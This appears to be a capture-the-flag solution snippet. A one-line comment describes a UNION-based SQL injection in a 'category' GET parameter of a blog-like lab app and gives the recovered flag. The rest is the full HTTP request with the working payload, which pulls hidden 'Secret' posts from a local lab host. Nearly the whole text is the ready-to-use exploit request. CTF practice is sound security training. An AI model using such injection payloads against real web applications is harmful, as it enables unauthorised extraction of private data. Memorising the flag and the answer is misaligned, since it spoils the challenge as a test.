# UNION-based SQL injection in category GET parameter. 7 columns. Extracts hidden Secret category posts containing CTF flag: flag{7b228415-018a-4446-ad84-66153396e7c6}

GET /?category=nonexistent%27+UNION+SELECT+1,title,category,content,image,6,7+FROM+posts+WHERE+category%3D%27Secret%27--+- HTTP/1.1
Host: 172.17.0.1:42909
